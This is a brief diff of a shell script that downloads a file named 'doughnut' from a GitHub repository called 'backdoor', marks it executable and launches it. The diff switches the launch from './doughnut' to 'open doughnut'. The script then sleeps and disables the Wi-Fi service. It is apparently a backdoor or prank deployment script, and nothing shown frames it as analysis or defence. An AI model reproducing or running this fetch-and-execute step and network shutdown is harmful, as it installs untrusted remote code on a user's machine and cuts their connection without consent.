@@ -6,7 +6,7 @@ cd ..
 cd ~/Desktop
 curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/doughnut"
 chmod +x doughnut
-./doughnut
+open doughnut
 sleep 260
 networksetup -setnetworkserviceenabled "Wi-Fi" off
 sleep 40
